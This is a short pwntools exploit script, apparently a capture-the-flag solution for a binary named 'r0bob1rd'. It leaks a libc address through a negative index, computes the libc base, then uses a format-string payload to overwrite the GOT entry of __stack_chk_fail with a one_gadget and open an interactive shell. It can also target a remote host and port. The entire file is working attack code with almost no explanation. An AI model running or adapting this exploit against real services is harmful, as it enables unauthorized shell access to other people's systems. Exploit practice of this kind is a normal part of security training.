#!/home/gh0st69/.venv/bin/python
from pwn import *
import os

os.system('clear')

def start(argv=[], *a, **kw):
    if args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    elif args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript="""
continue
"""

exe = './r0bob1rd'
elf = context.binary = ELF(exe, checksec=True)
context.log_level = 'INFO'

library = 'glibc/libc.so.6'
libc = context.binary = ELF(library, checksec=False)

sh = start()

## STAGE 1: Leak and Parse LIBC Runtime Leak + Relocate LIBC Base

sh.sendlineafter(b'>', b'-8')

sh.recvuntil(b'sen: ')
setvbuf = unpack(sh.recv(6) + b'\x00' * 2)
log.info(f'RECEIVED --> {hex(setvbuf)}')
libc.address = setvbuf - libc.sym['setvbuf']
log.success(f'LIBC BASE -> {hex(libc.address)}')

gadgets = (0xe3afe, 0xe3b01, 0xe3b04)
one_gadget = libc.address + gadgets[1]
log.success(f'ONE GADGET --> {hex(one_gadget)}')

## STAGE 2: Overwrite _stack_chk_fail() + Trigger it

payload = fmtstr_payload(8, {elf.got["__stack_chk_fail"]:one_gadget}, write_size="short")

sh.sendlineafter(b'>', payload.ljust(1024, b'\x90')) # -> no matter how much size we give we just overwrite the stack_chk_fail so if stack_chk_fail -> our /bin/bash

sh.interactive()